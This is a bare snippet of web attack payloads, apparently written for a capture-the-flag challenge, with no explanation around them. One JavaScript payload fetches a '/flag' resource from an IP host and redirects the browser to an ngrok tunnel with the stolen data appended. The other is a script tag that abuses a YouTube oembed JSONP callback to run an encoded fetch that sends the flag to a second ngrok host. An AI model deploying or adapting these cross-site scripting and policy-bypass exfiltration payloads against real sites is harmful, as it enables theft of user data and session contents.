fetch("http://165.232.190.5:1900/flag")
  .then(response => response.text())
  .then(data => {
    document.location = "https://9bf0-27-34-22-31.in.ngrok.io/" + data;
  })
  .catch(error => console.error(error));



<script src="https://youtube.com/oembed?callback=fetch%28%27http%3A%2F%2F165.232.190.5%3A2000%2Fflag%27%29.then%28function%28r%29%7Breturn%20r.text%28%29%3B%7D%29.then%28function%28d%29%20%7Bfetch%28%60https%3A%2F%2Fa0d0-27-34-22-31.in.ngrok.io%2F%24%7Bd%7D%60%29.then%28function%28a%29%7Breturn%20a.json%28%29%7D%29%7D%29%3B"></script>
